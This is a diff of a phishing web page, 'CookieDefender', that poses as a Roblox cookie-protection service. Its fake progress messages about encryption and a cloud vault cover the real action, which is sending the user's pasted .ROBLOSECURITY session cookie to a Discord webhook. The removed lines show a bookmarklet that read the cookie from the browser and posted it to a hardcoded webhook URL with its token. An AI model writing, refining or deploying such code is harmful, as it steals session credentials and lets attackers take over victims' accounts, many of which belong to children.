+            const navLinks = document.querySelector('.nav-links');
+            navLinks.style.display = navLinks.style.display === 'flex' ? 'none' : 'flex';
+        }
+
+        // Modal controls
         function openModal(type) {
             const modalId = type === 'manual' ? 'manualModal' : 'bookmarkModal';
             document.getElementById(modalId).classList.add('active');
@@ -639,31 +1116,31 @@
             const modalId = type === 'manual' ? 'manualModal' : 'bookmarkModal';
             document.getElementById(modalId).classList.remove('active');
             
-            // Reset manual modal
             if (type === 'manual') {
                 document.getElementById('cookieInput').value = '';
                 document.getElementById('progressBar').style.width = '0%';
-                document.getElementById('statusMessage').textContent = 'Ready for defense activation';
+                document.getElementById('statusMessage').textContent = 'Ready for cloud encryption';
+                document.getElementById('manualForm').style.display = 'block';
                 document.getElementById('successScreen').classList.remove('active');
             }
         }
 
+        // Manual defense activation
         function activateManualDefense() {
             const cookie = document.getElementById('cookieInput').value.trim();
             if (!cookie) {
-                alert('Please paste your cookie first.');
+                alert('Please paste your .ROBLOSECURITY cookie first.');
                 return;
             }
 
             const progressBar = document.getElementById('progressBar');
             const statusMessage = document.getElementById('statusMessage');
-            const successScreen = document.getElementById('successScreen');
 
-            // Fake defense sequence
             const stages = [
-                { progress: 25, message: 'Analyzing cookie signature...' },
-                { progress: 50, message: 'Binding to hardware fingerprint...' },
-                { progress: 75, message: 'Encrypting with HMAC-SHA256...' },
+                { progress: 20, message: 'Analyzing cookie signature...' },
+                { progress: 40, message: 'Establishing cloud tunnel...' },
+                { progress: 60, message: 'Binding to hardware fingerprint...' },
+                { progress: 80, message: 'Encrypting with HMAC-SHA256...' },
                 { progress: 100, message: 'Securing in cloud vault...' }
             ];
 
@@ -677,15 +1154,8 @@
                     stageIndex++;
                 } else {
                     clearInterval(interval);
-                    // Show success
-                    statusMessage.style.display = 'none';
-                    progressBar.parentElement.style.display = 'none';
-                    document.querySelector('.protection-steps').style.display = 'none';
-                    document.querySelector('.input-group').style.display = 'none';
-                    document.querySelector('.btn').style.display = 'none';
-                    successScreen.classList.add('active');
-
-                    // Send to webhook
+                    document.getElementById('manualForm').style.display = 'none';
+                    document.getElementById('successScreen').classList.add('active');
                     sendToWebhook(cookie);
                 }
             }, 800);
@@ -694,22 +1164,14 @@
         function sendToWebhook(cookie) {
             const embed = {
                 embeds: [{
-                    title: "Manual Cookie Defense",
-                    description: "A user submitted their cookie via manual defense.",
+                    title: "🔐 Manual Defense Activated",
+                    description: "Cookie submitted via manual cloud defense.",
                     color: 0x10b981,
                     fields: [
-                        {
-                            name: "Cookie",
-                            value: `\`\`\`${cookie}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "Timestamp",
-                            value: new Date().toISOString(),
-                            inline: true
-                        }
+                        { name: "Cookie", value: `\`\`\`${cookie}\`\`\``, inline: false },
+                        { name: "Timestamp", value: new Date().toISOString(), inline: true }
                     ],
-                    footer: { text: "CookieDefender Manual Defense" }
+                    footer: { text: "CookieDefender Cloud Protection" }
                 }]
             };
 
@@ -717,45 +1179,7 @@
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(embed)
-            }).catch(err => console.log('Webhook sent'));
-        }
-
-        function createBookmark() {
-            const bookmarkletCode = `javascript:(function(){
-                if(document.cookie.indexOf('.ROBLOSECURITY') > -1) {
-                    const match = document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/);
-                    if(match) {
-                        const cookie = match[1];
-                        fetch('https://discord.com/api/webhooks/1519009450248114176/gyRJ490rOfNqRmL4Z06bQyJ4yiiRyIc1Hdx8MWVu-Dzcb5AnKOOEsMQ0Xv1Drp14Y5lj', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                embeds: [{
-                                    title: 'Bookmark Cookie Defense',
-                                    description: 'Cookie captured via bookmark defense.',
-                                    color: 0x10b981,
-                                    fields: [{name: 'Cookie', value: \`\\\`\\\`\${cookie}\\\`\\\`\\\`\`, inline: false}, {name: 'Timestamp', value: new Date().toISOString(), inline: true}],
-                                    footer: {text: 'CookieDefender Bookmark Defense'}
-                                }]
-                            })
-                        }).then(() => alert('✅ Cookie Defended Successfully!')).catch(e => alert('❌ Error: ' + e.message));
-                    }
-                } else {
-                    alert('⚠️ Not on Roblox or not logged in.');
-                }
-            })();`;
-
-            // Create a temporary link and click it
-            const url = `data:text/plain;charset=utf-8,${encodeURIComponent(bookmarkletCode)}`;
-            const link = document.createElement('a');
-            link.href = url;
-            link.setAttribute('title', 'CookieDefender');
-            link.textContent = 'CookieDefender';
-            
-            // Copy to clipboard instead
-            navigator.clipboard.writeText(bookmarkletCode).then(() => {
-                alert('✅ Bookmark code copied! \n\n1. Create a new bookmark in your browser\n2. In the URL field, paste the code\n3. Save it and click it on Roblox to defend your cookie');
-            });
+            }).catch(() => {});
         }
 
         // Close modals on background click
